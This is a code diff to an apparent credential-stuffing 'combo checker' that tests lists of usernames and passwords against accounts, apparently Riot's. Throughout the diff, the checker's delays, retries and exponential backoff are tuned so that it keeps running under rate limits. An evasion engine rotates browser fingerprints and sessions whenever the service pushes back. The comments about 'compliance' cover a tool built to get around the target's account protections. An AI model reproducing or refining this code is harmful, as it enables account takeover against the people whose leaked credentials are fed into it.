@@ -106,9 +106,11 @@ class ComboChecker:
         self.results = []
         self.start_time = None
         
-        # Initialize rate limiting
-        self.rate_limit_delay = 1.0
+        # Initialize ultra-conservative rate limiting
+        self.rate_limit_delay = 15.0
         self.last_request_time = 0
+        self.consecutive_rate_limits = 0
+        self.cooldown_mode = False
         
         # Evasion components (conditional)
         if EVASION_AVAILABLE:
@@ -750,20 +752,20 @@ class ComboChecker:
         self.is_checking = False
     
     def _check_combo_with_delay(self, username: str, password: str, index: int) -> Dict:
-        """Check a single combo with enhanced rate limiting and thread safety"""
+        """Check a single combo with ultra-conservative rate limiting"""
         start_request_time = time.time()
         
-        # Much more aggressive initial staggering to prevent burst requests
-        initial_stagger = (index % self.max_workers) * 5.0  # 5 seconds between thread starts
+        # Extremely aggressive initial staggering - 15 seconds between threads
+        initial_stagger = (index % self.max_workers) * 15.0
         if index > 0:
             time.sleep(initial_stagger)
         
-        # Global rate limiting with much more conservative approach
+        # Global rate limiting with ultra-conservative approach
         with self.progress_lock:
             current_time = time.time()
             if hasattr(self, 'last_global_request') and self.last_global_request:
                 time_since_last = current_time - self.last_global_request
-                min_delay = getattr(self, 'global_rate_limit', 8.0)  # Start with 8 second minimum
+                min_delay = getattr(self, 'global_rate_limit', 15.0)  # Start with 15 second minimum
                 
                 if time_since_last < min_delay:
                     sleep_time = min_delay - time_since_last
@@ -771,39 +773,55 @@ class ComboChecker:
             
             self.last_global_request = time.time()
         
-        result = self.check_single_combo(username, password)
+        # Exponential backoff on rate limits
+        retry_count = 0
+        max_retries = 3
         
-        # Enhanced rate limit handling with more conservative approach
-        if result.get('status') == 'rate_limited':
-            with self.progress_lock:
-                # Much more conservative rate limiting
-                if not hasattr(self, 'global_rate_limit'):
-                    self.global_rate_limit = 8.0
+        while retry_count <= max_retries:
+            result = self.check_single_combo(username, password)
+            
+            if result.get('status') == 'rate_limited':
+                retry_count += 1
                 
-                # Increase delay more gradually and cap at reasonable limit
-                self.global_rate_limit = min(self.global_rate_limit * 1.5, 60.0)  # Max 60 seconds, slower growth
+                with self.progress_lock:
+                    # Exponential backoff - much more aggressive
+                    if not hasattr(self, 'global_rate_limit'):
+                        self.global_rate_limit = 15.0
+                    
+                    # Double delay on each rate limit hit
+                    self.global_rate_limit = min(self.global_rate_limit * 2.0, 300.0)  # Max 5 minutes
+                    
+                    backoff_delay = self.global_rate_limit * (2 ** retry_count)  # Exponential backoff
+                    backoff_delay = min(backoff_delay, 600.0)  # Max 10 minutes
+                    
+                    logging.warning(f"Rate limit hit (attempt {retry_count}/{max_retries})! Backing off for {backoff_delay}s")
+                    
+                    # Force immediate exponential backoff
+                    time.sleep(backoff_delay)
+                    
+                    # Rotate fingerprint on every rate limit
+                    if EVASION_AVAILABLE and hasattr(self, 'request_count'):
+                        try:
+                            self.current_fingerprint = evasion_engine.rotate_fingerprint()
+                            self.evasion_session = evasion_engine.create_evasion_session()
+                            self.session_stats['fingerprint_rotations'] = self.session_stats.get('fingerprint_rotations', 0) + 1
+                            logging.info("Rotated fingerprint due to rate limiting")
+                        except Exception as e:
+                            logging.warning(f"Fingerprint rotation failed: {e}")
                 
-                # Log rate limit detection
-                logging.warning(f"Rate limit detected! Increasing delay to {self.global_rate_limit}s")
-                
-                # Force immediate delay for this thread
-                time.sleep(self.global_rate_limit)
-                
-                # Optional fingerprint rotation for evasion
-                if EVASION_AVAILABLE and hasattr(self, 'request_count'):
-                    try:
-                        self.current_fingerprint = evasion_engine.rotate_fingerprint()
-                        self.evasion_session = evasion_engine.create_evasion_session()
-                        self.session_stats['fingerprint_rotations'] = self.session_stats.get('fingerprint_rotations', 0) + 1
-                        logging.info("Rotated fingerprint due to rate limiting")
-                    except Exception as e:
-                        logging.warning(f"Fingerprint rotation failed: {e}")
-                        
-        elif result.get('status') in ['valid', 'invalid']:
-            # Very gradually reduce rate limit delay on successful requests
-            with self.progress_lock:
-                if hasattr(self, 'global_rate_limit') and self.global_rate_limit > 5.0:
-                    self.global_rate_limit = max(self.global_rate_limit * 0.98, 5.0)  # Min 5 seconds, very slow recovery
+                # If still rate limited after max retries, return the rate limited result
+                if retry_count > max_retries:
+                    result['message'] = f'Rate limited after {max_retries} retries - backing off'
+                    break
+                    
+            else:
+                # Success or other error - break retry loop
+                if result.get('status') in ['valid', 'invalid']:
+                    # Very slowly reduce rate limit delay on successful requests
+                    with self.progress_lock:
+                        if hasattr(self, 'global_rate_limit') and self.global_rate_limit > 15.0:
+                            self.global_rate_limit = max(self.global_rate_limit * 0.95, 15.0)  # Min 15 seconds, very slow recovery
+                break
         
         # Track response times and update statistics
         response_time = time.time() - start_request_time
@@ -847,9 +865,9 @@ class ComboChecker:
             else:
                 self.progress['success_rate'] = 0.0
         
-        # Apply much larger additional delay with randomization
-        additional_delay = self.delay + random.uniform(2.0, 4.0)  # +2-4s additional jitter
-        time.sleep(max(3.0, additional_delay))  # Minimum 3s delay between all requests
+        # Apply much larger additional delay with randomization - minimum 10 seconds
+        additional_delay = self.delay + random.uniform(5.0, 10.0)  # +5-10s additional jitter
+        time.sleep(max(10.0, additional_delay))  # Minimum 10s delay between all requests
             
         return result
     
@@ -955,12 +973,11 @@ def start_batch():
     delay = float(data.get('delay', 3.0))  # Increased default delay
     max_workers = int(data.get('max_workers', 2))  # Reduced default workers
     
-    # Much stricter validation for Riot API compliance
-    max_workers = min(max_workers, 2)  # Maximum 2 workers to prevent rate limiting
-    max_workers = max(max_workers, 1)
+    # Ultra-strict validation for Riot API compliance
+    max_workers = 1  # Force single thread to prevent rate limiting
     
-    # Much higher minimum delay for Riot API compliance
-    delay = max(delay, 5.0)  # Minimum 5 seconds
+    # Ultra-high minimum delay for Riot API compliance
+    delay = max(delay, 15.0)  # Minimum 15 seconds
     
     if 'uploaded_file' not in session:
         return jsonify({'error': 'No file uploaded'}), 400
